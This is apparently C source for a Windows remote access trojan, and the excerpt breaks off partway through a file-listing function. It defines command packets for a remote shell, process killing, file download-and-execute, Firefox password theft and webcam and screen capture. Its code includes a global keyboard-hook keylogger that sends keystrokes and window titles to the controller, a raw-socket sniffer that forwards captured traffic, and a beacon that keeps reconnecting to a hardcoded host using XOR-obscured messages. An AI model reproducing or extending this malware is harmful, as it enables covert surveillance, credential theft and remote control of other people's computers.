//#include <windows.h>
#include <winsock2.h>
#include <olectl.h>
#include <ole2.h>
#include <objbase.h>
#include <vfw.h>
#include <gdiplus.h>
#include <gdiplusenums.h>
#include <stdio.h>
#include <Tlhelp32.h>
#include <iphlpapi.h>

#include "resource.h"
#include "tiny.h"

#define _CRT_SECURE_NO_WARNINGS

#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib,"vfw32.lib")
#pragma comment(lib,"gdiplus.lib")
#pragma comment(lib,"Gdi32.lib ")
#pragma comment(lib, "iphlpapi.lib")


int PortFilter = 0;
#define	RATMSG_SOCKET	WM_USER+1

DWORD WINAPI SendScreenShot(LPVOID lpParam);
////////////////settings
int PORT = 1992;
char ServerVersion [30] = "Fuck Hack Hound.";
char IP [16] = "127.0.0.1";


HANDLE WebCamThread;
HANDLE ScreenThread;
/////////////////////////////////////////////////
//Packet Headers
/////////////////////////////////////////////////
#define  STATUS							1990
#define  PACKET_ADD_ID					1991
#define	 PACKET_USER_JOINED				1992
#define  PACKET_EXIT					1993
/////////////////////////////////////////////////
//Shell Packet headers
#define  PACKET_CMD_RECV			     2000
#define  PACKET_REMOTE_SHELL_START		 2001
/////////////////////////////////////////////////
//Task manager Packet headers
#define	 PACKET_TASK_MANAGER			 2002
#define	 PACKET_TASK_MANAGER_KILL		 2003
#define  PACKET_TASK_MANAGER_TASKS       2004
#define	 PACKET_TASK_MANAGER_KTASK		 2005
#define  PACKET_TASK_MANAGER_TEXT		 2006
#define  PACKET_TASK_MANAGER_TKILL		 2007
/////////////////////////////////////////////////
//File manager Packet headers
#define	 PACKET_FILE_MANAGER_DRIVE		 2010
#define	 PACKET_FILE_MANAGER_FOLDER		 2011
#define  PACKET_FILE_MANAGER_FILE		 2012
#define  PACKET_FILE_MANAGER_FILE_FOLDER 2013
#define	 PACKET_FILE_MANAGER_FILE_COPY   2014
#define  PACKET_FILE_MANAGER_NEW_FOLDER  2015
#define  PACKET_FILE_MANAGER_DELETE_FILE 2016
#define  PACKET_FILE_MANAGER_FILE_SETUP    2017
#define  PACKET_FILE_MANAGER_FILE_RENAME 2018
#define  PACKET_FILE_MANAGER_FILE_RECV_S 2019
#define  PACKET_FILE_MANAGER_FILE_RECV	 2020
#define  PACKET_FILE_MANAGER_FILE_C      2021
#define	 PACKET_FILE_MANAGER_FILE_DOWN	 2022
#define  PACKET_FILE_MANAGER_FILE_UPDATE_WIN 2023
#define  PACKET_FILE_MANAGER_SEARCH		 2024
#define  DONE							 2025
#define  PACKET_FILE_MANAGER_FILE_EXECUTE 2026
#define  PACKET_FILE_MANAGER_FILE_OPEN	 2027
#define  PACKET_FILE_DOWNLOAD_STAT		 2028
/////////////////////////////////////////////////
//Computer Packet headers
#define  PACKET_COMPUTER_LOGOFF			 2030
#define  PACKET_COMPUTER_SHUTDOWN		 2031
#define  PACKET_COMPUTER_LOCK			 2032
/////////////////////////////////////////////////
//Keylogger Packet headers
#define  PACKET_KEYLOGGER		         2060
#define  PACKET_KEYLOGGER_WINDOW		 2061
#define  PACKET_KEYLOGGER_OFF			 2062
#define  PACKET_KEYLOG_OFFLINE			 2063
#define  PACKET_KEYLOG_DOWNLOAD			 2064
#define  PACKET_KEYLOG_OPEN				 2065
#define	 PACKET_KEYLOG_DOWNLOAD_UPDATE	 2066
/////////////////////////////////////////////////
#define  PACKET_RESUME					 2040
//////////////////////////////////////////////////
//Screen capture
#define  SCREEN_CAPTURE					 2050
#define  SCREEN_SHOT_OPEN				 2051
#define	 SCREEN_SHOT_CLOSE				 2052
#define  SCREEN_SHOT_RECV				 2053
//////////////////////////////////////////////////
//Passwords
#define  PASSWORD_FIREFOX				 2070
////////////////////////////////////////////////
//Services
#define  PACKET_SERVICE_MAN				 2080
#define  PACKET_SERVICE_STARTA			 2081
#define  PACKET_SERVICE_STOPA			 2082
////////////////////////////////////////////////
//RegManager
#define  PACKET_REG_MANAGER				 2090
////////////////////////////////////////////////
//Packet Structer
#define  PACKET_DOWNLOAD_EXECUTE		 3000
////////////////////////////////////////////////
//Query Installs	
#define  PACKET_PROGRAM_FILES			 3010
#define  EXECUTE						 3011
////////////////////////////////////////////////
#define	 WEBCAM_CAPTURE					 3020
#define  WEBCAM_SHOT_OPEN				 3021
#define	 WEBCAM_SHOT_CLOSE				 3022
#define  WEBCAM_SHOT_RECV				 3023
////////////////////////////////////////////////
#define  PACKET_SNIFFER					 3030
#define	 PACKET_SNIFFER_UPDATE			 3031
#define	 PACKET_SNIFFER_PORTS			 3032
#define	 PACKET_SNIFFER_PORTS_REFRESH	 3033
#define  PACKET_SNIFFER_PORTS_CLOSE		 3034
////////////////////////////////////////////////

#define FILE_BUFF_SZ 0xFF

#define SIO_RCVALL _WSAIOW(IOC_VENDOR,1)
#define ISINLIMIT(a, l, u) (a >= l && a <= u)

#define MALLOC(x) HeapAlloc(GetProcessHeap(), 0, (x))
#define FREE(x) HeapFree(GetProcessHeap(), 0, (x))

char FileNameA[10] = "log.txt";
char f_buff[FILE_BUFF_SZ];


HANDLE FileHandle;
DWORD numb_bytes;
int			    KEYID = 0;

HANDLE KeyLog;
HHOOK theHook;
int buff_idx;
BOOL			KeyConnect = 0;
HANDLE WindowLog;
#define DLLEXPORT __declspec(dllexport)
#define WIN32_LEAN_AND_MEAN
#define WH_KEYBOARD_LL     13

typedef struct {
    DWORD vkCode;
    DWORD scanCode;
    DWORD flags;
    DWORD time;
    ULONG_PTR dwExtraInfo;
} KBDLLHOOKSTRUCT, *PKBDLLHOOKSTRUCT;


FILE * DOWN[1024];

HWND FBI;
HWND FileFBI;
HWND Window [1024];
SOCKADDR_IN	   RemAdr;
SOCKET client;
SOCKET FClient;
int SCREENX = 0;
int SCREENY = 0;
int LocalId = 0;

HINSTANCE GInstance;
char First [256]= "";
char Second [256] = "";

//IP Header Structure
typedef struct ip_hdr
{
    unsigned char  ip_header_len    :4;
    unsigned char  ip_version       :4;
    unsigned char  ip_tos;
    unsigned short ip_total_length;
    unsigned short ip_id;
    
    unsigned char  ip_frag_offset   :5;
    unsigned char  ip_more_fragment :1;
    unsigned char  ip_dont_fragment :1;
    unsigned char  ip_reserved_zero :1;
    
    unsigned char  ip_frag_offset1;
    
    unsigned char  ip_ttl;
    unsigned char  ip_protocol;
    unsigned short ip_checksum;
    unsigned int   ip_srcaddr;
    unsigned int   ip_destaddr;
}   IPV4_HDR;

//UDP Header Structure
typedef struct udp_hdr
{
    unsigned short source_port;
    unsigned short dest_port;
    unsigned short udp_length;
    unsigned short udp_checksum;
} UDP_HDR;

// TCP Header Structure
typedef struct tcp_header
{
    unsigned short source_port;
    unsigned short dest_port;
    unsigned int   sequence;
    unsigned int   acknowledge;
	
    unsigned char  ns             :1;
    unsigned char  reserved_part1 :3;
    unsigned char  data_offset    :4;
	
    unsigned char  fin :1;
    unsigned char  syn :1;
    unsigned char  rst :1;
    unsigned char  psh :1;
    unsigned char  ack :1;
    unsigned char  urg :1;
    unsigned char  ecn :1;
    unsigned char  cwr :1;
	
    unsigned short window;
    unsigned short checksum;
    unsigned short urgent_pointer;
} TCP_HDR;


FILE *fp = NULL;

void ProcessPacket(unsigned  char *, int);
void PrintTCPPacket(unsigned char *, int, int);
void PrintUDPPacket(unsigned char *, int, int);
void PrintFormatedData(FILE *, unsigned char *, int);

int total, tcp, udp, others, c;
struct sockaddr_in source, destination;

typedef struct
{
	DWORD	PacketType;
	char    Data		[4096];
	int		ID;
	int		ID2;
	int		ID3;
}FBIPACKET;
typedef struct 
{
	DWORD	PacketType;
	char	Buf [4096]; //res
	char	Buf1 [128]; //user lvl
	char    Buf2 [128]; //CPU
	char	Buf3 [128]; //ip / comp name
	char	Buf4 [128]; //OS / SP
	char	Buf5 [128]; //username
	char	Buf6 [128];	//Serverversion
	char	Buf7 [128];	//RAM
	int		ID;
	int		ID2;
	int		ID3;
}FBIPACKETA;
struct FileTransfer
{
	char Name [256];
	char Path [1024];
	int ItemIndex; 
	int FileID; 
};
typedef struct FFIND
{
	char filename[100];
	char dirname[100];
	int threadnum;
	BOOL silent;
	BOOL gotinfo;
	
} FFIND;
///////////////////////////////////////////////////////////////////
//
typedef void (WINAPI *PGNSI)(LPSYSTEM_INFO);

/////////////////////////////////////
//SOCKET FUNCTIONS

int hideandshow(char * text,char * hiddentext) {
	const unsigned char encvalues[8]={193,127,143,121,167,179,187,191};
	char ch;
	int max=strlen(text);
	int i;
	int eindex=0;
	for (i=0;i<max;i++) {
		ch=*text++;
		if (ch)
			*hiddentext++ = ch ^ encvalues[eindex++];
		else
			*hiddentext='\0';
		eindex %=8;
	}
	return max;
}

FBIPACKETA ParseData(char main [4096] = "")
{
int I = 0;
int P = 0;
int Y = 0;
int Count = 0;
FBIPACKETA Info;
ZeroMemory(&Info, sizeof(FBIPACKETA));
	while(main[I] != NULL)
	{
		switch(Count)
			{
			case 0: // ScreenResA
				  if(main[I] == '|' || main[I] == NULL )
				  {
					P = 0;
					Count++;
					break;
				  }
				  Info.Buf[P]= main[I];
				  P++;
				  Y++;
			break;
			case 1: // AdminA
				  if(main[I] == '|' || main[I] == NULL )
				  {
					P = 0;
					Count++;
					break;
				  }
			      Info.Buf1[P]= main[I];
				  P++;
				  Y++;
			break;
			case 2: // ProcessorName
				  if(main[I] == '|' || main[I] == NULL )
				  {
					P = 0;
					Count++;
					break;
				  }
			      Info.Buf2[P]= main[I];
				  P++;
				  Y++;
			break;
			case 3: // UserName
				  if(main[I] == '|' || main[I] == NULL )
				  {
					P = 0;
					Count++;
					break;
				  }
			      Info.Buf3[P]= main[I];
				  P++;
				  Y++;;
				
			break;
			case 4: // CompIp
				  if(main[I] == '|' || main[I] == NULL )
				  {
					P = 0;
					Count++;
					break;
				  }
			      Info.Buf4[P]= main[I];
				  P++;
			break;
			case 5: // OS
			
				  if(main[I] == '|' || main[I] == NULL )
				  {
					P = 0;
					Count++;
					break;
				  }
			      Info.Buf5[P] = main[I];
				  P++;
			break;
			
			case 6: // OS
			
				  if(main[I] == '|' || main[I] == NULL )
				  {
					P = 0;
					Count++;
					break;
				  }
			      Info.Buf6[P] = main[I];
				  P++;
				  break;
			case 7: // OS
			
				  if(main[I] == '|' || main[I] == NULL )
				  {
					P = 0;
					Count++;
					break;
				  }
			      Info.Buf7[P] = main[I];
				  P++;
				  break;
			}
		
		I++;

	}
return Info;
}

int FBISend(SOCKET sock,
			char MainData [4096],
			int ID, int ID2, int ID3,
			DWORD PacketType)
{
FBIPACKET FBI;
char buffer[4098]={'\0'};
//Temp = EnDeCrypt(MainData, strlen((const char *)MainData), (const char *)Key);
ZeroMemory(&FBI, sizeof(FBIPACKET));
ZeroMemory(buffer, sizeof(buffer));
if(PacketType != PACKET_FILE_MANAGER_FILE_RECV)
{
hideandshow(MainData,buffer);
strcpy(FBI.Data, buffer);
}
else
{
strcpy(FBI.Data, MainData);
}
FBI.ID = ID;
FBI.ID2 = ID2;
FBI.ID3 = ID3;
FBI.PacketType = PacketType;

while(send(sock,(char *)&FBI, sizeof(FBIPACKET), 0) == SOCKET_ERROR)
{
Sleep(1000);
}
return 0;
}

///////////////////////////////////////////////////////////////////////
//Recv Data
FBIPACKETA FBIRecv(SOCKET sock)
{
FBIPACKET FBIRecv;
FBIPACKETA FBIRecvB;
char buffer[4096]={'\0'};
char * Temp = NULL;
while(recv(sock,(char*)&FBIRecv,sizeof(FBIPACKET),0) == SOCKET_ERROR)
{
Sleep(100);
}
//Temp = EnDeCrypt(FBIRecv.Data, strlen((const char *)FBIRecv.Data), (const char *)Key);

hideandshow(FBIRecv.Data,buffer);
FBIRecvB = ParseData(buffer);
FBIRecvB.ID  = FBIRecv.ID;
FBIRecvB.ID2 = FBIRecv.ID2;
FBIRecvB.ID3 = FBIRecv.ID3;
FBIRecvB.PacketType = FBIRecv.PacketType;
return FBIRecvB;
}
///////////////////////////////////////////////////////////////////////
//socket startup
void InitWSA()
{
	WORD	wVersionRequested;
	WSADATA wsaData;
	int		err;
	wVersionRequested = MAKEWORD( 2, 0 );
    err = WSAStartup( wVersionRequested, &wsaData );
    if ( err != 0 )
		PostQuitMessage(1);

    if ( LOBYTE( wsaData.wVersion ) != 2 || HIBYTE( wsaData.wVersion ) != 0 )
	{
	    WSACleanup();
		PostQuitMessage(0);
	}
}
//////////////////////////////////////////////////////
//Connect Async Socket
void FBIConnect(HWND hwnd, char * FIP, int FPORT, int sleep)
{

      WORD wVersionRequested;
      WSADATA wsaData;
      char * ip = "";
      PHOSTENT hostinfo;
      wVersionRequested = MAKEWORD( 2, 0 );
	  int ConRes = 0;
	  char Buffer [20] = "";
	  if ( WSAStartup( wVersionRequested, &wsaData ) == 0 )
      {
                  if((hostinfo = gethostbyname(FIP)) != NULL)
                  {
                        ip = inet_ntoa (*(struct in_addr *)*hostinfo->h_addr_list);
                  }
		//MessageBox(NULL, ip, "ip", MB_OK);
      }
		InitWSA();
        do
		{
		Sleep(1000);
		RemAdr.sin_family = AF_INET;
		RemAdr.sin_addr.s_addr=inet_addr(ip);
		RemAdr.sin_port = htons (FPORT);
		client = socket (AF_INET,SOCK_STREAM,0);
	    ConRes=connect (client, (struct sockaddr *)&RemAdr,sizeof(RemAdr));
		}while(ConRes==-1);
		
		WSAAsyncSelect(client,hwnd,RATMSG_SOCKET,FD_READ|FD_CLOSE|FD_CONNECT);
return;
}
void FBIFileConnect(HWND hwnd, char * FIP, int FPORT, int sleep)
{
	
	WORD wVersionRequested;
	WSADATA wsaData;
	char * ip = "";
	PHOSTENT hostinfo;
	wVersionRequested = MAKEWORD( 2, 0 );
	int ConRes = 0;
	char Buffer [20] = "";
	if ( WSAStartup( wVersionRequested, &wsaData ) == 0 )
	{
		if((hostinfo = gethostbyname(FIP)) != NULL)
		{
			ip = inet_ntoa (*(struct in_addr *)*hostinfo->h_addr_list);
		}
		//MessageBox(NULL, ip, "ip", MB_OK);
	}
	do
	{
		Sleep(1000);
		RemAdr.sin_family = AF_INET;
		RemAdr.sin_addr.s_addr=inet_addr(ip);
		RemAdr.sin_port = htons (FPORT);
		FClient = socket (AF_INET,SOCK_STREAM,0);
		ConRes=connect (FClient, (struct sockaddr *)&RemAdr,sizeof(RemAdr));
	}while(ConRes==-1);
	
	WSAAsyncSelect(client,hwnd,RATMSG_SOCKET,FD_READ|FD_CLOSE|FD_CONNECT);
	return;
}
int ShowPorts ()
{
	   // Declare and initialize variables
    PMIB_TCPTABLE pTcpTable;
    DWORD dwSize = 0;
    DWORD dwRetVal = 0;
	
    char szLocalAddr[128];
    char szRemoteAddr[128];
	char Buffer [32] = "";
	char BufferF [1024] = "";
    struct in_addr IpAddr;	
	
    int i;
	
    pTcpTable = (MIB_TCPTABLE *) MALLOC(sizeof (MIB_TCPTABLE));
    if (pTcpTable == NULL) 
	{
        printf("Error allocating memory\n");
        return 1;
    }
	
    dwSize = sizeof (MIB_TCPTABLE);
	// Make an initial call to GetTcpTable to
	// get the necessary size into the dwSize variable
    if ((dwRetVal = GetTcpTable(pTcpTable, &dwSize, TRUE)) == ERROR_INSUFFICIENT_BUFFER) 
	{
        FREE(pTcpTable);
        pTcpTable = (MIB_TCPTABLE *) MALLOC(dwSize);
        if (pTcpTable == NULL) {
            printf("Error allocating memory\n");
            return 1;
        }
    }
	// Make a second call to GetTcpTable to get
	// the actual data we require
    if ((dwRetVal = GetTcpTable(pTcpTable, &dwSize, TRUE)) == NO_ERROR) 
	{
        for (i = 0; i < (int) pTcpTable->dwNumEntries; i++) 
		{
            IpAddr.S_un.S_addr = (u_long) pTcpTable->table[i].dwLocalAddr;
            strcpy(szLocalAddr, inet_ntoa(IpAddr));
            IpAddr.S_un.S_addr = (u_long) pTcpTable->table[i].dwRemoteAddr;
            strcpy(szRemoteAddr, inet_ntoa(IpAddr));
			ZeroMemory(Buffer, sizeof(Buffer));
			ZeroMemory(BufferF, sizeof(BufferF));
            switch (pTcpTable->table[i].dwState) 
			{
            case MIB_TCP_STATE_CLOSED:
                strcpy(Buffer, "CLOSED");
                break;
            case MIB_TCP_STATE_LISTEN:
                strcpy(Buffer,"LISTEN");
                break;
            case MIB_TCP_STATE_SYN_SENT:
                strcpy(Buffer,"SYN-SENT");
                break;
            case MIB_TCP_STATE_SYN_RCVD:
                strcpy(Buffer,"SYN-RECEIVED");
                break;
            case MIB_TCP_STATE_ESTAB:
                strcpy(Buffer,"ESTABLISHED");
                break;
            case MIB_TCP_STATE_FIN_WAIT1:
                strcpy(Buffer,"FIN-WAIT-1");
                break;
            case MIB_TCP_STATE_FIN_WAIT2:
                strcpy(Buffer,"FIN-WAIT-2");
                break;
            case MIB_TCP_STATE_CLOSE_WAIT:
                strcpy(Buffer,"CLOSE-WAIT");
                break;
            case MIB_TCP_STATE_CLOSING:
                strcpy(Buffer,"CLOSING");
                break;
            case MIB_TCP_STATE_LAST_ACK:
                strcpy(Buffer,"LAST-ACK");
                break;
            case MIB_TCP_STATE_TIME_WAIT:
                strcpy(Buffer,"TIME-WAIT");
                break;
            case MIB_TCP_STATE_DELETE_TCB:
                strcpy(Buffer,"DELETE-TCB");
                break;
            default:
                strcpy(Buffer,"UNKNOWN dwState value");
                break;
            }
		sprintf(BufferF, "%s|%d|%s|%d|%s",szLocalAddr,
			ntohs((u_short)pTcpTable->table[i].dwLocalPort), 
		 szRemoteAddr, 
			ntohs((u_short)pTcpTable->table[i].dwRemotePort), 
			Buffer);
	
			FBISend(client, BufferF, LocalId, 0,0,PACKET_SNIFFER_PORTS);
        }
    } 
	else 
	{
        FREE(pTcpTable);
        return 1;
    }
	return 0;

}
DWORD WINAPI PacketSniffer(LPVOID lParam)
{
    WSADATA wsa;
    SOCKET sniffer;
    struct in_addr addr;
    int j = 1; unsigned long i;

    char    hostname[100];
    struct  hostent *local;
    FBISend(client, "Initializing Winsock 2.2...\r\n", LocalId, 0,0, PACKET_SNIFFER);
    if(WSAStartup(MAKEWORD(2, 2), &wsa)) {
        printf("WSAStartup() Failed to initialize winsock version 2.2!\n");
        return 1;
    }

    FBISend(client, "Creating RAW socket...\r\n", LocalId, 0,0, PACKET_SNIFFER);
    sniffer = socket(AF_INET, SOCK_RAW, IPPROTO_IP);
    if(sniffer == SOCKET_ERROR) {
        printf("Failed to create RAW socket, exiting\n");
        return 1;
    }

    if(gethostname(hostname, 100) == SOCKET_ERROR) {
        printf("Error : %d, exiting...\n", WSAGetLastError());
        return 1;
    }

    local = gethostbyname(hostname);
    if(!local) {
        printf("Error : %d, exiting...\n", WSAGetLastError());
        return 1;
    }
    for(i = 0; local->h_addr_list[i] != 0; ++i) {
        memcpy(&addr, local->h_addr_list[i], sizeof(struct in_addr));
        printf("Interface Number : %d\tAddress : %s\n", i, inet_ntoa(addr));
    }
	i = 0;

    memset(&destination, 0, sizeof(destination));
    memcpy(&destination.sin_addr.s_addr, local->h_addr_list[i], sizeof(destination.sin_addr.s_addr));
    destination.sin_family = AF_INET;
    destination.sin_port   = 0;

    if(bind(sniffer, (struct sockaddr *)&destination, sizeof(destination)) == SOCKET_ERROR) {
     
        return 1;
    }
	
    FBISend(client,"Configuring socket for packet interception\r\n", LocalId, 0,0, PACKET_SNIFFER);
    WSAIoctl(sniffer, SIO_RCVALL, &j, sizeof(j), 0, 0, &i, 0, 0);
    
    unsigned char *recvbuffer; int recvbytes;
    recvbuffer = (unsigned char *)malloc(65536);
    if(!recvbuffer) {
        printf("Dynamic memory allocation error, exiting!\n");
        return 1;
    }
	
    FBISend(client,"Starting the sniffing process...\r\n\r\n\r\n", LocalId, 0,0, PACKET_SNIFFER);
    printf("Starting the sniffing process...\n");
    printf("Packet capture logged in log.txt\n");

    total = tcp = udp = others = 0;
       do {
        recvbytes = recvfrom(sniffer, (char *)recvbuffer, 65536, 0, 0, 0);
        if(recvbytes > 0) ProcessPacket(recvbuffer, recvbytes);
        else printf("recvfrom() encountered an error, exiting!\n");
    } while(recvbytes != SOCKET_ERROR || recvbytes > 0);

    free(recvbuffer);
    closesocket(sniffer);
    return 0;
}

void ProcessPacket(unsigned char *buffer, int len)
{
    IPV4_HDR *ipheader = (IPV4_HDR *)buffer;
    switch(ipheader->ip_protocol) {
        case 6:
            tcp++;
            PrintTCPPacket(buffer, len, PortFilter); // This last parameter is a 'port filter', only http trafic is logged when you specifiy port 80
            break;
        case 17:
            udp++;
            PrintUDPPacket(buffer, len, PortFilter); // This last parameter is a 'port filter', only http trafic is logged when you specifiy port 80
            break;
        default:
            others++;
            break;
    }
    //printf("Packet Totals :: TCP - %d UDP - %d OTHERS - %d TOTAL - %d\r", tcp, udp, others, ++total);
}

void PrintTCPPacket(unsigned char *buffer, int len, int filter_port)
{
    IPV4_HDR *ipheader  = (IPV4_HDR *)buffer;
    TCP_HDR  *tcpheader = (TCP_HDR  *)(buffer + (ipheader->ip_header_len * 4));
    struct in_addr s, d;
	char PBuffer [4096] = "";
    s.S_un.S_addr = ipheader->ip_srcaddr;
    d.S_un.S_addr = ipheader->ip_destaddr;

    if(filter_port)
        if(ntohs(tcpheader->dest_port) != filter_port && ntohs(tcpheader->source_port) != filter_port)
            return;

	sprintf(PBuffer, "TCP Packet Information:\r\nSource IP: %s DESTINATION IP: %s\r\nSOURCE PORT: %d DESTINATION PORT: %d\r\n PACKET DATA:\r\n",
		inet_ntoa(s),
		inet_ntoa(d),
		ntohs(tcpheader->dest_port), ntohs(tcpheader->source_port));
    FBISend(client,PBuffer, LocalId, 0,0, PACKET_SNIFFER);
    PrintFormatedData(fp, buffer + (ipheader->ip_header_len * 4) + (tcpheader->data_offset * 4), len - (ipheader->ip_header_len * 4) - (tcpheader->data_offset * 4));
    
    FBISend(client,"\r\n#############################################################\r\n\r\n", LocalId, 0,0, PACKET_SNIFFER);
}

void PrintUDPPacket(unsigned char *buffer, int len, int filter_port)
{
    IPV4_HDR *ipheader  = (IPV4_HDR *)buffer;
    UDP_HDR  *udpheader = (UDP_HDR  *)(buffer + (ipheader->ip_header_len * 4));
    struct in_addr s, d;
	
	char PBuffer [4096] = "";
    s.S_un.S_addr = ipheader->ip_srcaddr;
    d.S_un.S_addr = ipheader->ip_destaddr;

    if(filter_port)
        if(ntohs(udpheader->dest_port) != filter_port && ntohs(udpheader->source_port) != filter_port)
            return;

	sprintf(PBuffer, "UDP Packet Information:\n Source IP: %s DESTINATION IP: %s\n SOURCE PORT: %d DESTINATION PORT: %d\n PACKET DATA:\n",
		inet_ntoa(s),
		inet_ntoa(d),
		ntohs(udpheader->dest_port), ntohs(udpheader->source_port));
    FBISend(client,PBuffer, LocalId, 0,0, PACKET_SNIFFER);
    PrintFormatedData(fp, buffer + (ipheader->ip_header_len * 4) + sizeof(UDP_HDR), len - sizeof(UDP_HDR) - (ipheader->ip_header_len * 4));
    
    FBISend(client,"#############################################################\n\n", LocalId, 0,0, PACKET_SNIFFER);
}

void PrintFormatedData(FILE *fp, unsigned char *buffer, int len)
{
    FBISend(client,(char *)buffer, LocalId, 0,0, PACKET_SNIFFER);
}
/////////////////////////////////////////////////////////////////
//Keylogger
DLLEXPORT LRESULT CALLBACK KeyEvent(int nCode, WPARAM wParam, LPARAM lParam) 
{
static BOOL unicode = FALSE;
static HWND old_active = NULL;
//HWND active;
static HKL keyboardlayout = NULL;
BYTE keyboardState[256] = {0};
KBDLLHOOKSTRUCT keyboard;
DWORD windowThreadProcessId;
//Char buff[MAX_LEN];
WCHAR keybuff[255]= {0};
int i;

i = 0;
windowThreadProcessId = 0;

if (nCode < 0)
return CallNextHookEx(theHook, nCode, wParam, lParam);

if((wParam == WM_KEYDOWN)|| (wParam == WM_SYSKEYDOWN)||(wParam == WM_SYSKEYUP)) {
keyboard = *((KBDLLHOOKSTRUCT*)lParam);
GetKeyboardState(keyboardState);



if(keyboard.vkCode == VK_RETURN)
i += sprintf (((char*)keybuff + i), "\n");


if (unicode)

i = ToUnicodeEx((keyboard.vkCode), (keyboard.scanCode), keyboardState, keybuff, (sizeof(keybuff) / 16), (GetKeyState(VK_MENU) >> 7), keyboardlayout);

else

i = ToAsciiEx((keyboard.vkCode), (keyboard.scanCode), keyboardState, ((LPWORD)keybuff), (GetKeyState(VK_MENU) >> 7), keyboardlayout);


sprintf((f_buff + buff_idx), "%s", keybuff);
if(KeyConnect)
	{	
	FBISend(client,f_buff, LocalId, 0,0, PACKET_KEYLOGGER);
	}
	else
	{
	WriteFile(FileHandle, f_buff, strlen(f_buff), &numb_bytes, NULL);
	buff_idx = 0;
	}

}
return CallNextHookEx(theHook, nCode, wParam, lParam);

}
void Msgloop(void) 
{
MSG mess;
while (GetMessage(&mess,NULL,0,0)) 
{
TranslateMessage(&mess);
DispatchMessage(&mess);

}
}


DWORD WINAPI KeyLoggerWin(LPVOID lParam)
{
HWND ForeHandle;
char window_text[500];
char old_window_text[500];
while(1)
{
Sleep(10);
ForeHandle = GetForegroundWindow();
           if (ForeHandle != NULL) 
		   {
              if (GetWindowText(ForeHandle, (char*)&window_text, 499) != 0) 
			  {
                 if (strcmp(window_text, old_window_text)) 
				 {
					if(KeyConnect)
					{
					FBISend(client,window_text, LocalId, 0,0, PACKET_KEYLOGGER_WINDOW);
                    strcpy(old_window_text, window_text);
					}
					else
					{
					sprintf(old_window_text, "\r\n \r\n[%s] \r\n  \r\n", window_text);
				    WriteFile(FileHandle, old_window_text, strlen(old_window_text), &numb_bytes, NULL);
				    strcpy(old_window_text, window_text);
					}
                 }
              }
           }
		   Sleep(1);
}

}
DWORD WINAPI KeyLogger(LPVOID lParam)
{
HINSTANCE exe;
int res = 0;
DWORD thread;
//PACKETHEAD Win;
if(KeyConnect)
{
//MessageBox(NULL, "CONNECTED", "CONNECTED", MB_OK);
CreateThread(NULL, 0,SendScreenShot,(LPVOID)3, 0, &thread);
}
else
{
FileHandle = CreateFile (FileNameA, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0); //FILE_ATTRIBUTE_HIDDEN
}
WindowLog = CreateThread(NULL, 0,KeyLoggerWin,(LPVOID)FileNameA, 0, &thread);

//WriteFile(FileHandle, Win.Data, strlen(Win.Data), &numb_bytes, NULL);
exe = GetModuleHandle(NULL);
if(!exe)
{
res = 1;
}
else 
{
theHook = SetWindowsHookEx ( WH_KEYBOARD_LL, (HOOKPROC) KeyEvent, exe, 0);
if(theHook == NULL)
{
//MessageBox(NULL, "NULL", "NULL", MB_OK);
}

Msgloop(); // eternal loop
UnhookWindowsHookEx(theHook);
}
return TRUE;	
}
///////////////////////////////////////////////////////////////
//-----------------------------------------------------------//
///////////////////////////////////////////////////////////////
//ProgramList
#define MAX_KEY_LENGTH 255
#define MAX_VALUE_NAME 16383

int QueryInstalls(HKEY hKey)
{
    TCHAR    achKey[MAX_KEY_LENGTH];   // buffer for subkey name
    DWORD    cbName;                   // size of name string
    TCHAR    achClass[MAX_PATH] = TEXT("");  // buffer for class name
    DWORD    cchClassName = MAX_PATH;  // size of class string
    DWORD    cSubKeys=0;               // number of subkeys
    DWORD    cbMaxSubKey;              // longest subkey size
    DWORD    cchMaxClass;              // longest class string
    DWORD    cValues;              // number of values for key
    DWORD    cchMaxValue;          // longest value name
    DWORD    cbMaxValueData;       // longest value data
    DWORD    cbSecurityDescriptor; // size of security descriptor
    FILETIME ftLastWriteTime;      // last write time
    char     Value [1024] = "";
    DWORD i, retCode;
    
	
    char NEW [1024] = "";
    char data [1024] = "";
	char Data [1024] = "";
    unsigned long datalen = sizeof(data);  
    unsigned long datatype;
    HKEY hKkey;
	
	//    TCHAR  achValue[MAX_VALUE_NAME];
    DWORD cchValue = MAX_VALUE_NAME;
	
    // Get the class name and the value count.
    retCode = RegQueryInfoKey(
        hKey,                    // key handle
        achClass,                // buffer for class name
        &cchClassName,           // size of class string
        NULL,                    // reserved
        &cSubKeys,               // number of subkeys
        &cbMaxSubKey,            // longest subkey size
        &cchMaxClass,            // longest class string
        &cValues,                // number of values for this key
        &cchMaxValue,            // longest value name
        &cbMaxValueData,         // longest value data
        &cbSecurityDescriptor,   // security descriptor
        &ftLastWriteTime);       // last write time
	
    // Enumerate the subkeys, until RegEnumKeyEx fails.
    
    if (cSubKeys)
    {
		//printf( "\nNumber of subkeys: %d\n", cSubKeys);
		
        for (i=0; i<cSubKeys; i++)
        {
            cbName = MAX_KEY_LENGTH;
            retCode = RegEnumKeyEx(hKey, i,
				achKey,
				&cbName,
				NULL,
				NULL,
				NULL,
				&ftLastWriteTime);
            if (retCode == ERROR_SUCCESS)
            {
                strcpy(NEW, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\");
                strcat(NEW, achKey);
				
				if (!RegOpenKeyExA(HKEY_LOCAL_MACHINE, NEW, NULL, KEY_QUERY_VALUE, &hKkey) == ERROR_SUCCESS)
				{
					//MessageBox(NULL,"FAIL","FAIL", MB_OK);
				}
				
				if (RegQueryValueExA(hKkey, "", NULL, &datatype, (unsigned char *)data,  &datalen) == ERROR_SUCCESS)
				{
					sprintf(Data, "%s|%s", data, achKey);
					FBISend(client, Data, LocalId, 0, 0, PACKET_PROGRAM_FILES);
				}
                
                
                Sleep(10);
                
            }
        }
    }
	
	
    return 0;
}
//////////////////////////////////////////////////////////////////////
//-----------------------------------------------------------------//
/////////////////////////////////////////////////////////////////////
//FileManager

int ListDir(char dir[1024]) 
{
   WIN32_FIND_DATA ffd;
   LARGE_INTEGER filesize;
   TCHAR szDir[MAX_PATH];
   HANDLE hFind = INVALID_HANDLE_VALUE;
   DWORD dwError=0;
	char FileExtention [10] = "";
	int C = 0;
	int H = 0;
	int ID3 = 0;
	char BufferAB [100] = "";
	char DataSize [100] = "";
	char Data [100] = "";
   lstrcpy(szDir, dir);
   lstrcat(szDir, "*");
   wsprintf(BufferAB, "%d", LocalId);

    hFind = FindFirstFile(szDir, &ffd);
